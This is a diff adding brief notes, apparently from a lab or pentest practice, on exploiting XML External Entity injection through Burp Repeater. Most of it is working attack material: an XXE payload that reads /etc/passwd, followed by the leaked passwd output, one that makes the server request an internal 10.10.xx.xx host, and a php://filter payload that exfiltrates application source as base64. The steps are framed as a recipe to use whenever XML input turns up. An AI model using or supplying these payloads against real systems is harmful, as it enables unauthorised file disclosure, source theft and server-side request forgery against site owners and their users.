@@ -1,0 +1,73 @@
+# A4 OWASP Top 10
+# When you find XML data you can use burp to carry out an XML External Entity injection
+
+1. Intercept the request GET
+2. Send to repeater
+3. After the last header specified in RAW
+4. Enter the XML Data to see if it changes the Output
+
+
+Example -
+
+GET /hosts.php HTTP/1.1
+Host: <IP ADDRESS>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: html
+Accept-Language: charset
+Accept-Encoding: gzip, deflate
+Connection: open
+Upgrade-Insecure-Requests: 1
+Content-Length: 90
+
+<details>
+    <subnet_mask>255.255.255.192</subnet_mask>
+    <test></test>
+</details>
+
+# This means we can use this to read sensitive info as well
+
+# Let's use something malicious
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE Header [ <!ENTITY xxe SYSTEM "///etc/passwd"> ]>
+<details>
+    <subnet_mask>&xxe;</subnet_mask>
+    <test></test>
+</details>
+
+Response -
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+---SNIP SNIP---
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
+cliff:x:1001:1001::/home/cliff:/bin/bash
+mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
+
+# Taking this further an XXE can create HTTP requests -
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE Header [ <!ENTITY xxe SYSTEM "http://10.10.xx.xx:8081/testlll"> ]>
+<details>
+    <subnet_mask>255.255.255.192</subnet_mask>
+    <test>&xxe;</test>
+</details>
+
+# We can access other file by using the wrapper php://filter/read=convert.base64-encode/resource=
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE Header [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/hosts.php"> ]>
+<details>
+    <subnet_mask>&xxe;</subnet_mask>
+    <test></test>
+</details>
